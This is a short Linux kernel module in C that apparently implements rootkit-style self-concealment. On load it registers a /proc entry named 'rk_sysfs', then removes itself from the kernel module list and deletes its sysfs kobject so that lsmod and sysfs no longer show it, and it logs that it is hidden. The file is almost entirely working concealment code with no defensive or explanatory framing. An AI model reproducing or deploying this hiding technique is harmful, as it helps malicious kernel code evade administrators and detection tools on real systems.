// SPDX-License-Identifier: GPL-2.0
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>

static struct proc_dir_entry *entry;

static void hide_module(void)
{
	list_del_init(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	pr_info("rk: module hidden from lsmod and sysfs\n");
}

static int cloak_show(struct seq_file *m, void *v)
{
	seq_puts(m, "hidden\n");
	return 0;
}

static int __init cloak_init(void)
{
	entry = proc_create_single("rk_sysfs", 0444, NULL, cloak_show);
	if (!entry)
		return -ENOMEM;

	hide_module();
	return 0;
}

static void __exit cloak_exit(void)
{
	proc_remove(entry);
}

module_init(cloak_init);
module_exit(cloak_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Module-list and sysfs-view concealment");
